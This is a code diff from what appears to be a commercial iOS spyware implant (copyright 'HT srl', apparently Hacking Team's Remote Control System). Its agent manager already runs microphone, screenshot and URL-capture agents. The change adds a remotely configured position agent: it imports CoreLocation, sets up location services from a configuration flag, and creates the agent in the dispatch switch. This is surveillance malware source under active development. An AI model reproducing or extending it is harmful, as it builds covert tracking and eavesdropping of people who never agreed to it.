@@ -6,6 +6,8 @@
 //  Copyright 2012 HT srl. All rights reserved.
 //
 #import <mach/mach.h>
+#import <CoreLocation/CoreLocation.h>
+#import <objc/runtime.h>
 
 #import "RCSIAgentManager.h"
 #import "RCSICommon.h"
@@ -23,6 +25,7 @@
 #import "RCSIAgentMicrophone.h"
 #import "RCSIAgentScreenshot.h"
 #import "RCSIAgentURL.h"
+#import "RCSIAgentPositionSupport.h"
 
 NSString *kRunLoopAgentManagerMode = @"kRunLoopAgentManagerMode";
 
@@ -68,6 +71,8 @@ NSString *kRunLoopAgentManagerMode = @"kRunLoopAgentManagerMode";
   [agentsList release];
   [super dealloc];
 }
+
+
 
 #pragma mark -
 #pragma mark Main runloop
@@ -143,6 +148,15 @@ typedef struct _coreMessage_t
   
   if (agentInstance == nil)
     return;
+  
+  /*
+   * check if we can run  position remote agents
+   */
+  if (agentID == AGENT_POSITION)
+  {
+    UInt32 *flag = (UInt32*)[[agentInstance mAgentConfiguration] bytes];
+    [[RCSIAgentPositionSupport sharedInstance] checkAndSetupLocationServices: flag];
+  }
   
   time_t tmpCfgId = [[RCSIConfManager sharedInstance] mConfigTimestamp];
                      
@@ -418,6 +432,13 @@ typedef struct _coreMessage_t
     {
       // remote agent
       agentInstance = [[RCSIAgent alloc] initWithConfigData:nil];
+      [agentInstance setMAgentID: type];
+      break;
+    }
+    case AGENT_POSITION:
+    {
+      // remote agent
+      agentInstance = [[RCSIAgent alloc] initWithConfigData:aData];
       [agentInstance setMAgentID: type];
       break;
     }
